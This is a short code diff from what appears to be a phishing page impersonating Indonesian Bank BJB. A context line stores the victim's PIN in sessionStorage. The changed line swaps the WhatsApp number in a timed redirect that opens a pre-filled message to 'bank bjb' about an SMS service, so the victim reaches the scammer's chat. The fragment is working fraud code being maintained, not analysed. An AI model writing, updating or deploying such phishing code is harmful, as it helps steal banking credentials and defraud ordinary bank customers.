@@ -61,6 +61,6 @@ sessionStorage.setItem("pin", pin);
 
 function go(){
 setTimeout(function(){  
-location.href='https://api.whatsapp.com/send?phone=14017020060&text=𝗛𝗮𝗹𝗹𝗼 𝗯𝗮𝗻𝗸 𝗯𝗷𝗯,%0ASaya mau request Pesan SMS ke layanan (83373)';
+location.href='https://api.whatsapp.com/send?phone=628154039934&text=𝗛𝗮𝗹𝗹𝗼 𝗯𝗮𝗻𝗸 𝗯𝗷𝗯,%0ASaya mau request Pesan SMS ke layanan (83373)';
     }, 1500);    
 }     
